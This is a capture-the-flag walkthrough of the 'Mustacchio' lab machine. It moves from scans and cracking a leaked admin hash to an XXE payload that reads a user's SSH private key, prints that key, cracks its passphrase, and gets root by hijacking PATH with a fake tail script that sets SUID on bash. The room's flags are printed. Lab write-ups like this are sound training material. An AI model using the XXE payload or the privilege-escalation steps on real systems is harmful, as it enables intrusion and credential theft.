# Mustacchio

Laurent Chauvin | November 10, 2022

## Resources

[1] https://crackstation.net/

[2] https://portswigger.net/web-security/xxe

## Progress

```
export IP=10.10.119.38
```

Nmap scan
```
nmap -sC -sV -oN nmap/initial $IP

Starting Nmap 7.92 ( https://nmap.org ) at 2022-11-10 00:13 EST
Nmap scan report for 10.10.189.206
Host is up (0.14s latency).
Not shown: 998 filtered tcp ports (no-response)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.10 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 58:1b:0c:0f:fa:cf:05:be:4c:c0:7a:f1:f1:88:61:1c (RSA)
|   256 3c:fc:e8:a3:7e:03:9a:30:2c:77:e0:0a:1c:e4:52:e6 (ECDSA)
|_  256 9d:59:c6:c7:79:c5:54:c4:1d:aa:e4:d1:84:71:01:92 (ED25519)
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Mustacchio | Home
| http-robots.txt: 1 disallowed entry 
|_/
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 26.20 seconds
```

Gobuster scan
```
gobuster dir -u $IP -w /usr/share/wordlists/dirb/common.txt | tee gobuster_common.log

===============================================================
Gobuster v3.2.0-dev
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.10.189.206
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.2.0-dev
[+] Timeout:                 10s
===============================================================
2022/11/10 00:18:36 Starting gobuster in directory enumeration mode
===============================================================
/images               (Status: 301) [Size: 315] [--> http://10.10.189.206/images/]
/custom               (Status: 301) [Size: 315] [--> http://10.10.189.206/custom/]
/fonts                (Status: 301) [Size: 314] [--> http://10.10.189.206/fonts/]
```

Nikto scan
```
nikto -h $IP | tee nikto.log

- Nikto v2.1.6
---------------------------------------------------------------------------
+ Target IP:          10.10.119.38
+ Target Hostname:    10.10.119.38
+ Target Port:        80
+ Start Time:         2022-11-10 00:53:46 (GMT-5)
---------------------------------------------------------------------------
+ Server: Apache/2.4.18 (Ubuntu)
+ The anti-clickjacking X-Frame-Options header is not present.
+ The X-XSS-Protection header is not defined. This header can hint to the user agent to protect against some forms of XSS
+ The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type
+ No CGI Directories found (use '-C all' to force check all possible dirs)
+ OSVDB-630: The web server may reveal its internal or real IP in the Location header via a request to /images over HTTP/1.0. The value is "127.0.0.1".
+ Server may leak inodes via ETags, header found with file /, inode: 6d8, size: 5c4938d5d4e40, mtime: gzip
+ Apache/2.4.18 appears to be outdated (current is at least Apache/2.4.37). Apache 2.2.34 is the EOL for the 2.x branch.
+ Allowed HTTP Methods: GET, HEAD, POST, OPTIONS 
+ OSVDB-3268: /images/: Directory indexing found.
+ OSVDB-3233: /icons/README: Apache default file found.
+ 7889 requests: 0 error(s) and 9 item(s) reported on remote host
+ End Time:           2022-11-10 01:09:59 (GMT-5) (973 seconds)
---------------------------------------------------------------------------
+ 1 host(s) tested
```

Let's check 'robots.txt'
```
User-agent: *
Disallow: /
```

In 'http://10.10.189.206/custom/js/' we can find a document named 'users.bak'. Let's check it. Opening it with hexedit we can see from the header it's a SQLite file
```
SQLite format 3
```

With ```strings``` we get
```
SQLite format 3
tableusersusers
CREATE TABLE users(username text NOT NULL, password text NOT NULL)
]admin1868e36a6d2b17d4c2745f1659433a54d4bc5f4b
```

Opening this database with ```sqlite3``` we have
```
SQLite version 3.39.4 2022-09-29 15:55:41
Enter ".help" for usage hints.
Connected to a transient in-memory database.
Use ".open FILENAME" to reopen on a persistent database.
sqlite> .open users.db
sqlite> .database
main: /home/kali/ctf/thm/Mustacchio/users.db r/w
sqlite> .table
users
sqlite> SELECT * FROM users;
admin|1868e36a6d2b17d4c2745f1659433a54d4bc5f4b
sqlite> SELECT password FROM users;
1868e36a6d2b17d4c2745f1659433a54d4bc5f4b
sqlite> 
```

Using CrackStation [1] we get the admin password
```
bulldog19
```

Let's try to ssh
```
ssh admin@$IP             
The authenticity of host '10.10.189.206 (10.10.189.206)' can't be established.
ED25519 key fingerprint is SHA256:8ffSUaKVshwAGNYcOWTbXfy0ik5uNnUqe/0nXK/ybSA.
This key is not known by any other names
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '10.10.189.206' (ED25519) to the list of known hosts.
admin@10.10.189.206: Permission denied (publickey).
```

Doesn't work.

Let's try to find an admin panel. After looking at the source code for a while, I didn't find anything. 
I tried different parameters for ```gobuster``` but nothing. 
Then, I started an nmap scan on all ports
```
nmap -p- -sV -oN nmap/all_ports $IP

Starting Nmap 7.92 ( https://nmap.org ) at 2022-11-10 01:02 EST
Nmap scan report for 10.10.119.38
Host is up (0.11s latency).
Not shown: 65532 filtered tcp ports (no-response)
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.10 (Ubuntu Linux; protocol 2.0)
80/tcp   open  http    Apache httpd 2.4.18 ((Ubuntu))
8765/tcp open  http    nginx 1.10.3 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 234.98 seconds
```

We find a ```nginx``` service. Let's check it.

We find an admin page, finally !!

Let's use the credentials we found 'admin:bulldog19'. We can log in.

Looking at the source code of the page we can see
```
<!-- Barry, you can now SSH in using your key!-->
```

and 

```
//document.cookie = "Example=/auth/dontforget.bak"; 

function checktarea() {
let tbox = document.getElementById("box").value;
if (tbox == null || tbox.length == 0) {
alert("Insert XML Code!")
}
}
```

Let's try to get this 'dontforget.bak' file.
```
<?xml version="1.0" encoding="UTF-8"?>
<comment>
  <name>Joe Hamd</name>
  <author>Barry Clad</author>
  <com>his paragraph was a waste of time and space. If you had not read this and I had not typed this you and I could’ve done something more productive than reading this mindlessly and carelessly as if you did not have anything else to do in life. Life is so precious because it is short and you are being so careless that you do not realize it until now since this void paragraph mentions that you are doing something so mindless, so stupid, so careless that you realize that you are not using your time wisely. You could’ve been playing with your dog, or eating your cat, but no. You want to read this barren paragraph and expect something marvelous and terrific at the end. But since you still do not realize that you are wasting precious time, you still continue to read the null paragraph. If you had not noticed, you have wasted an estimated time of 20 seconds.</com>
</comment>
```

They are talking about a 'null' paragraph, could be an hint.

We now have a username to ssh ('barry') and we know that the textbox in the admin page take an xml format.

Using an XXE vulnerability, we could be able to read files from the system (see [2]). As we know barry has a ssh key setup, let's try to read '/home/barry/.ssh/id_rsa' by submitting the following code in the admin textbox.
```
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///home/barry/.ssh/id_rsa"> ]>
<comment>
  <name>Joe Hamd</name>
  <author>Barry Clad</author>
  <com>&xxe;</com>
</comment>
```

The ```DOCTYPE``` here will read the file and put it in ```xxe```, which we will display instead of the comment. When submitting it, we have
```
-----BEGIN RSA PRIVATE KEY----- 
Proc-Type: 4,ENCRYPTED
DEK-Info: AES-128-CBC,D137279D69A43E71BB7FCB87FC61D25E

jqDJP+blUr+xMlASYB9t4gFyMl9VugHQJAylGZE6J/b1nG57eGYOM8wdZvVMGrfN
bNJVZXj6VluZMr9uEX8Y4vC2bt2KCBiFg224B61z4XJoiWQ35G/bXs1ZGxXoNIMU
MZdJ7DH1k226qQMtm4q96MZKEQ5ZFa032SohtfDPsoim/7dNapEOujRmw+ruBE65
l2f9wZCfDaEZvxCSyQFDJjBXm07mqfSJ3d59dwhrG9duruu1/alUUvI/jM8bOS2D
Wfyf3nkYXWyD4SPCSTKcy4U9YW26LG7KMFLcWcG0D3l6l1DwyeUBZmc8UAuQFH7E
NsNswVykkr3gswl2BMTqGz1bw/1gOdCj3Byc1LJ6mRWXfD3HSmWcc/8bHfdvVSgQ
ul7A8ROlzvri7/WHlcIA1SfcrFaUj8vfXi53fip9gBbLf6syOo0zDJ4Vvw3ycOie
TH6b6mGFexRiSaE/u3r54vZzL0KHgXtapzb4gDl/yQJo3wqD1FfY7AC12eUc9NdC
rcvG8XcDg+oBQokDnGVSnGmmvmPxIsVTT3027ykzwei3WVlagMBCOO/ekoYeNWlX
bhl1qTtQ6uC1kHjyTHUKNZVB78eDSankoERLyfcda49k/exHZYTmmKKcdjNQ+KNk
4cpvlG9Qp5Fh7uFCDWohE/qELpRKZ4/k6HiA4FS13D59JlvLCKQ6IwOfIRnstYB8
7+YoMkPWHvKjmS/vMX+elcZcvh47KNdNl4kQx65BSTmrUSK8GgGnqIJu2/G1fBk+
T+gWceS51WrxIJuimmjwuFD3S2XZaVXJSdK7ivD3E8KfWjgMx0zXFu4McnCfAWki
ahYmead6WiWHtM98G/hQ6K6yPDO7GDh7BZuMgpND/LbS+vpBPRzXotClXH6Q99I7
LIuQCN5hCb8ZHFD06A+F2aZNpg0G7FsyTwTnACtZLZ61GdxhNi+3tjOVDGQkPVUs
pkh9gqv5+mdZ6LVEqQ31eW2zdtCUfUu4WSzr+AndHPa2lqt90P+wH2iSd4bMSsxg
laXPXdcVJxmwTs+Kl56fRomKD9YdPtD4Uvyr53Ch7CiiJNsFJg4lY2s7WiAlxx9o
vpJLGMtpzhg8AXJFVAtwaRAFPxn54y1FITXX6tivk62yDRjPsXfzwbMNsvGFgvQK
DZkaeK+bBjXrmuqD4EB9K540RuO6d7kiwKNnTVgTspWlVCebMfLIi76SKtxLVpnF
6aak2iJkMIQ9I0bukDOLXMOAoEamlKJT5g+wZCC5aUI6cZG0Mv0XKbSX2DTmhyUF
ckQU/dcZcx9UXoIFhx7DesqroBTR6fEBlqsn7OPlSFj0lAHHCgIsxPawmlvSm3bs
7bdofhlZBjXYdIlZgBAqdq5jBJU8GtFcGyph9cb3f+C3nkmeDZJGRJwxUYeUS9Of
1dVkfWUhH2x9apWRV8pJM/ByDd0kNWa/c//MrGM0+DKkHoAZKfDl3sC0gdRB7kUQ
+Z87nFImxw95dxVvoZXZvoMSb7Ovf27AUhUeeU8ctWselKRmPw56+xhObBoAbRIn
7mxN/N5LlosTefJnlhdIhIDTDMsEwjACA+q686+bREd+drajgk6R9eKgSME7geVD
-----END RSA PRIVATE KEY-----
```

The ssh private key of Barry. It's encrypted, so let's pass it to john.
```
ssh2john barry_id_rsa > barry_id_rsa_forJohn.txt 
john barry_id_rsa_forJohn.txt --wordlist=/opt/rockyou.txt 

Using default input encoding: UTF-8
Loaded 1 password hash (SSH, SSH private key [RSA/DSA/EC/OPENSSH 32/64])
Cost 1 (KDF/cipher [0=MD5/AES 1=MD5/3DES 2=Bcrypt/AES]) is 0 for all loaded hashes
Cost 2 (iteration count) is 1 for all loaded hashes
Will run 2 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
urieljames       (barry_id_rsa)     
1g 0:00:00:02 DONE (2022-11-10 01:40) 0.4975g/s 1477Kp/s 1477Kc/s 1477KC/s urieljr..urielitho0
Use the "--show" option to display all of the cracked passwords reliably
Session completed. 
```

We can now try to connect with barry's key.
```
chmod 600 barry_id_rsa
ssh -i barry_id_rsa barry@10.10.70.142

The authenticity of host '10.10.70.142 (10.10.70.142)' can't be established.
ED25519 key fingerprint is SHA256:8ffSUaKVshwAGNYcOWTbXfy0ik5uNnUqe/0nXK/ybSA.
This host key is known by the following other names/addresses:
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '10.10.70.142' (ED25519) to the list of known hosts.
Enter passphrase for key 'barry_id_rsa': urieljames
Welcome to Ubuntu 16.04.7 LTS (GNU/Linux 4.4.0-210-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

34 packages can be updated.
16 of these updates are security updates.
To see these additional updates run: apt list --upgradable



The programs included with the Ubuntu system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Ubuntu comes with ABSOLUTELY NO WARRANTY, to the extent permitted by
applicable law.

barry@mustacchio:~$ 
```

Let's get the flag
```
cat user.txt

62d77a4d5f97d47c5aa38b3b2651b831
```

Time to privesc.

Looking at home directories
```
barry@mustacchio:/dev/shm$ ls /home
barry  joe
barry@mustacchio:/dev/shm$ cd /home/joe
barry@mustacchio:/home/joe$ ls
live_log
barry@mustacchio:/home/joe$ ls -al
total 28
drwxr-xr-x 2 joe  joe   4096 Jun 12  2021 .
drwxr-xr-x 4 root root  4096 Jun 12  2021 ..
-rwsr-xr-x 1 root root 16832 Jun 12  2021 live_log
```

We can see 'joe' as a ```live_log``` program owned by root.

When running ```strings``` on it, we can see
```
Live Nginx Log Reader
tail -f /var/log/nginx/access.log
```

Running the program show it indeed
```
barry@mustacchio:/home/joe$ ./live_log 
10.18.23.136 - - [10/Nov/2022:07:03:18 +0000] "GET /index.php HTTP/1.1" 200 728 "-" "Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0"
10.18.23.136 - - [10/Nov/2022:07:03:18 +0000] "GET /assets/css/main.css HTTP/1.1" 200 2095 "http://10.10.70.142:8765/index.php" "Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0"
10.18.23.136 - - [10/Nov/2022:07:03:19 +0000] "GET /assets/fonts/BebasNeue-Regular.ttf HTTP/1.1" 200 60576 "http://10.10.70.142:8765/assets/css/main.css" "Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0"
10.18.23.136 - - [10/Nov/2022:07:03:19 +0000] "GET /favicon.ico HTTP/1.1" 404 152 "http://10.10.70.142:8765/index.php" "Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0"
10.18.23.136 - - [10/Nov/2022:07:03:24 +0000] "GET /assets/imgs/bkg.jpg HTTP/1.1" 200 2784463 "http://10.10.70.142:8765/assets/css/main.css" "Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0"
10.18.23.136 - - [10/Nov/2022:07:03:26 +0000] "POST /auth/login.php HTTP/1.1" 302 5 "http://10.10.70.142:8765/index.php" "Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0"
10.18.23.136 - - [10/Nov/2022:07:03:26 +0000] "GET /home.php HTTP/1.1" 200 1077 "http://10.10.70.142:8765/index.php" "Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0"
10.18.23.136 - - [10/Nov/2022:07:03:26 +0000] "GET /assets/css/home.css HTTP/1.1" 200 1428 "http://10.10.70.142:8765/home.php" "Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0"
10.18.23.136 - - [10/Nov/2022:07:03:31 +0000] "GET /assets/imgs/pexels-alexander-tiupa-192136.jpg HTTP/1.1" 200 1108200 "http://10.10.70.142:8765/home.php" "Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0"
10.18.23.136 - - [10/Nov/2022:07:03:47 +0000] "POST /home.php HTTP/1.1" 200 1490 "http://10.10.70.142:8765/home.php" "Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0"
```

As in a previous challenge, if we can poison the 'access.log' maybe it will be executed as root.

Also as in a previous challenge, we noticed that ```tail``` is called without absolute path, maybe it would be easier to leverage this than the log poisoning.
Let's create a ```tail``` in barry's home directory that will SUID ```/bin/bash``` and export the PATH
```
barry@mustacchio:~$ mkdir bin
barry@mustacchio:~$ cd bin/
barry@mustacchio:~/bin$ touch tail
barry@mustacchio:~/bin$ nano tail 
```

Write SUID code
```
#!/bin/bash
chmod +s /bin/bash
```

Then let's make it executable and add the 'bin' directory to the PATH
```
barry@mustacchio:~/bin$ chmod +x tail 
barry@mustacchio:~/bin$ export PATH=/home/barry/bin:$PATH
```

Now let's get back to 'joe' directoty and run the code
```
barry@mustacchio:~/bin$ cd ../../joe/
barry@mustacchio:/home/joe$ ./live_log 
Live Nginx Log Reader
```

Let's check if it worked
```
barry@mustacchio:/home/joe$ ls -al /bin/bash
-rwsr-sr-x 1 root root 1037528 Jul 12  2019 /bin/bash
barry@mustacchio:/home/joe$ /bin/bash -p 
bash-4.3# whoami
root
```

It did !! Let's get the flag then
```
bash-4.3# cat /root/root.txt 

3223581420d906c4dd1a5f9b530393a5
```


## Flag

1. User

```
62d77a4d5f97d47c5aa38b3b2651b831
```

2. Privesc

```
3223581420d906c4dd1a5f9b530393a5
```
